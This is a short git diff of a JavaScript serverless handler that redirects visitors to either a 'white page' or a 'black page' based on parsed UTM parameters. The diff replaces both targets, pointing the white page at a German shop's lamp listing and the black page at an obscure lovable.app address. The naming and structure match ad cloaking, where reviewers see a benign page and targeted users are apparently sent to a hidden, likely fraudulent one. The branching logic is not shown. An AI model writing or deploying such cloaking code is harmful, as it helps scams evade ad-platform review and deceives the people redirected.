@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://kleman-france.com/en/417914086.html";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.otto.de/p/star-trading-stehlampe-standleuchte-stern-karo-ein-ausschalter-ohne-leuchtmittel-tischlampe-weihnachtsstern-deko-stern-7-zackig-weihnachtsdeko-C1907363350/";
+    const blackPageURL = "https://lucurfreeeccssh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
